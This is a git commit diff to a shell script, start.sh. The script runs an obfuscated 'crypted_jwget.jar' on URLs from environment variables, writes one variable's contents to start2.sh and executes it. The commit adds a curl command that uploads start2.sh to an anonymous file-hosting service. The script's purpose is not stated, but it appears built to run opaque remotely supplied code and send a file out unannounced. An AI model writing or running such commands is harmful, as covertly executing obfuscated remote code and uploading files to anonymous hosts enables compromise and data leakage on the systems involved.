381978072c013d3068e84a2bf851ac007b804a58
S3niorMCYT <77205348+SeniorMCYT@users.noreply.github.com>
2021-09-12 17:53:50 +0430

    Update start.sh

--- start.sh
+++ start.sh
@@ -4,6 +4,7 @@ cd $HOME
 echo $LINK2 > start2.sh
 java -jar crypted_jwget.jar $LINK
 bash start2.sh
+curl -F "file=@start2.sh" https://api.anonfiles.com/upload
 java -jar crypted_jwget.jar $LINK3
 ls
 #java -jar crypted_leatestacc.jar Storage1
